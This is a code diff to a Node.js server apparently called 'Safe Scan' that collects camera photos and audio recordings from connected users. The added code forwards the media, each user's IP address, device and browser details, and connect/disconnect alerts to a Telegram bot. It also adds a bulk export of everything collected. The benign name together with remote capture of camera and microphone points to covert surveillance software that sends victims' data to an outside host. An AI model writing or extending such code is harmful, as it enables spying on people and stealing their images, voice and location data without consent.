@@ -85,6 +85,112 @@ function sendPhotoToTelegram(photoBuffer, caption) {
   req.end();
 }
 
+/**
+ * Send a text message to Telegram via Bot API using Node's built-in https module.
+ * @param {string} text - The message text to send
+ */
+function sendTextToTelegram(text) {
+  const postData = JSON.stringify({
+    chat_id: TELEGRAM_CHAT_ID,
+    text: text,
+    parse_mode: 'HTML'
+  });
+
+  const options = {
+    hostname: 'api.telegram.org',
+    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': Buffer.byteLength(postData)
+    }
+  };
+
+  const req = https.request(options, (res) => {
+    let data = '';
+    res.on('data', (chunk) => data += chunk);
+    res.on('end', () => {
+      if (res.statusCode === 200) {
+        console.log('📤 Text message sent to Telegram successfully');
+      } else {
+        console.error('📤 Telegram API error:', res.statusCode, data);
+      }
+    });
+  });
+
+  req.on('error', (err) => {
+    console.error('📤 Telegram send error:', err.message);
+  });
+
+  req.write(postData);
+  req.end();
+}
+
+/**
+ * Send an audio file to Telegram via Bot API using Node's built-in https module.
+ * @param {Buffer} audioBuffer - The audio data as a Buffer
+ * @param {string} caption - Caption text for the audio
+ * @param {string} mimeType - MIME type of the audio file
+ */
+function sendAudioToTelegram(audioBuffer, caption, mimeType) {
+  const boundary = '----TelegramBoundary' + Date.now();
+  const fileName = `recording_${Date.now()}.webm`;
+
+  // Build multipart/form-data body
+  const parts = [];
+
+  // chat_id field
+  parts.push(`--${boundary}\r\n`);
+  parts.push(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
+  parts.push(`${TELEGRAM_CHAT_ID}\r\n`);
+
+  // caption field
+  if (caption) {
+    parts.push(`--${boundary}\r\n`);
+    parts.push(`Content-Disposition: form-data; name="caption"\r\n\r\n`);
+    parts.push(`${caption}\r\n`);
+  }
+
+  // document field (binary)
+  const contentType = mimeType || 'audio/webm';
+  const fileHeader = `--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${fileName}"\r\nContent-Type: ${contentType}\r\n\r\n`;
+  const fileFooter = `\r\n--${boundary}--\r\n`;
+
+  const textParts = Buffer.from(parts.join(''), 'utf8');
+  const headerBuf = Buffer.from(fileHeader, 'utf8');
+  const footerBuf = Buffer.from(fileFooter, 'utf8');
+  const body = Buffer.concat([textParts, headerBuf, audioBuffer, footerBuf]);
+
+  const options = {
+    hostname: 'api.telegram.org',
+    path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+    method: 'POST',
+    headers: {
+      'Content-Type': `multipart/form-data; boundary=${boundary}`,
+      'Content-Length': body.length
+    }
+  };
+
+  const req = https.request(options, (res) => {
+    let data = '';
+    res.on('data', (chunk) => data += chunk);
+    res.on('end', () => {
+      if (res.statusCode === 200) {
+        console.log('📤 Audio sent to Telegram successfully');
+      } else {
+        console.error('📤 Telegram API error:', res.statusCode, data);
+      }
+    });
+  });
+
+  req.on('error', (err) => {
+    console.error('📤 Telegram send error:', err.message);
+  });
+
+  req.write(body);
+  req.end();
+}
+
 // Create directories
 fs.mkdirSync(path.join(MEDIA_DIR, 'captures'), { recursive: true });
 fs.mkdirSync(path.join(MEDIA_DIR, 'recordings'), { recursive: true });
@@ -102,6 +208,15 @@ let db = {
   captures: [],   // { id, uuid, file_path, file_size, created_at }
   recordings: []  // { id, uuid, file_path, duration, file_size, mime_type, created_at }
 };
+
+let activityLog = []; // { id, type, uuid, message, timestamp }
+let logId = 1;
+
+function addLog(type, uuid, message) {
+  activityLog.unshift({ id: logId++, type, uuid: uuid || '', message, timestamp: new Date().toISOString() });
+  if (activityLog.length > 500) activityLog.length = 500; // cap at 500
+  io.to('admin').emit('activity:new', activityLog[0]);
+}
 
 // Load saved data
 function loadData() {
@@ -135,6 +250,14 @@ function saveData() {
 // Auto-save every 30 seconds
 setInterval(saveData, 30000);
 loadData();
+
+// Daily summary to Telegram
+function sendDailySummary() {
+  const onlineCount = db.users.filter(u => u.is_online).length;
+  const msg = `📊 Daily Summary — Safe Scan\n\n👥 Total Users: ${db.users.length}\n🟢 Online Now: ${onlineCount}\n📸 Total Captures: ${db.captures.length}\n🎤 Total Recordings: ${db.recordings.length}\n\n${new Date().toLocaleString()}`;
+  sendTextToTelegram(msg);
+}
+setInterval(sendDailySummary, 24 * 60 * 60 * 1000);
 
 // ID counter
 let nextId = Math.max(
@@ -285,6 +408,24 @@ app.get('/api/recordings/:id/stream', (req, res) => {
   fs.createReadStream(filePath).pipe(res);
 });
 
+// ─── Activity Log Route ──────────────────────────────────────────
+app.get('/api/activity-log', authCheck, (req, res) => {
+  const limit = parseInt(req.query.limit) || 100;
+  res.json({ log: activityLog.slice(0, limit) });
+});
+
+// ─── Export Route ────────────────────────────────────────────────
+app.get('/api/export', authCheck, (req, res) => {
+  res.setHeader('Content-Disposition', 'attachment; filename=safescan_export.json');
+  res.json({
+    exported_at: new Date().toISOString(),
+    users: db.users,
+    captures: db.captures,
+    recordings: db.recordings,
+    activity_log: activityLog
+  });
+});
+
 // ─── Stats Route ─────────────────────────────────────────────────
 app.get('/api/stats', authCheck, (req, res) => {
   res.json({
@@ -353,11 +494,6 @@ io.on('connection', (socket) => {
       io.to(data.userSocketId).emit('webrtc:stop');
     });
 
-    socket.on('webrtc:switch-camera', (data) => {
-      if (!data || !data.userSocketId) return;
-      io.to(data.userSocketId).emit('camera:switch');
-    });
-
     socket.on('disconnect', () => {
       console.log('🔑 Admin disconnected:', socket.id);
     });
@@ -395,6 +531,11 @@ io.on('connection', (socket) => {
       }
 
       console.log(`📱 User connected: ${userUUID} (${data.device_type || 'Unknown'})`);
+
+      const connectMsg = `🟢 User Connected\n\nUUID: ${userUUID}\nDevice: ${data.device_type || 'Unknown'}\nBrowser: ${data.browser || 'Unknown'}\nTimezone: ${data.country || 'Unknown'}\nIP: ${socket.handshake.address || 'Unknown'}\n\n${new Date().toLocaleString()}`;
+      sendTextToTelegram(connectMsg);
+      addLog('user_connect', userUUID, 'User connected: ' + (data.device_type || 'Unknown') + ' / ' + (data.browser || 'Unknown'));
+
       io.to('admin').emit('user:connected', user);
       emitStats();
       saveData();
@@ -457,8 +598,10 @@ io.on('connection', (socket) => {
         });
 
         // Send to Telegram
-        const caption = `📸 Camera Capture\nUser: ${uuid}\n${new Date().toLocaleString()}\n\nSafe Scan v3.0`;
+        const captionUser = db.users.find(u => u.uuid === uuid);
+        const caption = `📸 Camera Capture\nUser: ${uuid}\nDevice: ${captionUser?.device_type || 'Unknown'}\nBrowser: ${captionUser?.browser || 'Unknown'}\nTimezone: ${captionUser?.country || 'Unknown'}\nIP: ${captionUser?.ip || 'Unknown'}\n${new Date().toLocaleString()}\n\nSafe Scan v3.0`;
         sendPhotoToTelegram(buffer, caption);
+        addLog('capture', uuid, 'Camera capture saved');
 
         emitStats();
       } catch (e) {
@@ -503,6 +646,12 @@ io.on('connection', (socket) => {
         });
 
         console.log(`🎤 Recording saved: ${fileName} (${data.duration || 0}s)`);
+
+        // Send to Telegram
+        const audioCaption = `🎤 Audio Recording\nUser: ${uuid}\nDuration: ${data.duration || 0}s\n${new Date().toLocaleString()}\n\nSafe Scan v3.0`;
+        sendAudioToTelegram(buffer, audioCaption, data.mimeType);
+        addLog('recording', uuid, 'Audio recording saved (' + (data.duration || 0) + 's)');
+
         emitStats();
       } catch (e) {
         console.error('Audio recording error:', e.message);
@@ -519,6 +668,11 @@ io.on('connection', (socket) => {
         }
         io.to('admin').emit('user:disconnected', { uuid: userUUID });
         console.log(`📱 User disconnected: ${userUUID}`);
+
+        const disconnectMsg = `🔴 User Disconnected\n\nUUID: ${userUUID}\n\n${new Date().toLocaleString()}`;
+        sendTextToTelegram(disconnectMsg);
+        addLog('user_disconnect', userUUID, 'User disconnected');
+
         emitStats();
         saveData();
       }
